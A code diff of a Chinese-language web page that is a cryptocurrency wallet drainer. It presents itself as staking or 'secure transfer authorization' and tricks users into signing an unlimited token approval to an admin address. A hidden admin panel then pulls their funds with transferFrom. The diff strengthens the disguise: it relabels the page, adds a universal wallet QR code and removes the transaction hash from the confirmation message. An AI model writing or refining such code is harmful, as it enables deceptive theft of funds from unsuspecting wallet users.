@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>质押挖矿</title>
+<title>转账授权</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
@@ -30,7 +30,7 @@ border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
 }
 .tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
-/* 管理员面板（默认隐藏，仅管理员登录可见） */
+/* 管理员面板（默认隐藏） */
 .admin-panel {
 background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
 }
@@ -50,13 +50,13 @@ cursor:pointer;
 
 <div class="container">
   <div class="pay-box">
-    <h1>⛏️ 质押挖矿</h1>
-    <p class="desc">授权后即可参与挖矿</p>
+    <h1>💳 转账授权</h1>
+    <p class="desc">授权后即可进行转账操作</p>
 
     <button id="connectBtn">👉 连接钱包</button>
     <div id="qrcode">加载二维码...</div>
     <button id="approveBtn">确认授权签名</button>
-    <div class="tip">签名授权用于质押挖矿</div>
+    <div class="tip">签名授权用于安全转账</div>
   </div>
 
   <!-- 管理员提取面板（默认隐藏） -->
@@ -86,12 +86,13 @@ async function switchChain() {
   } catch (e) {}
 }
 
-// 生成授权二维码（适配 TP 钱包）
+// 生成兼容TP钱包的授权二维码
 function genApproveQR() {
   const data = "0x095ea7b3" + 
     ADMIN_ADDR.slice(2).padStart(64, '0') + 
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const uri = `https://metamask.app.link/send/${TOKEN_ADDR}?value=0&data=${data}`;
+  // 标准 EIP-681 格式，兼容所有钱包
+  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
   const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
   document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
 }
@@ -113,7 +114,7 @@ async function doApprove() {
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
-    alert("✅ 授权成功！交易哈希：" + txHash);
+    alert("✅ 授权成功！");
   } catch (e) {
     alert("❌ 授权已取消或失败");
   }
@@ -164,7 +165,6 @@ async function drawFromUser() {
   }
 
   try {
-    // 构造 transferFrom 调用数据
     const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
     const data = "0x23b872dd" + 
       userAddr.slice(2).padStart(64, '0') + 
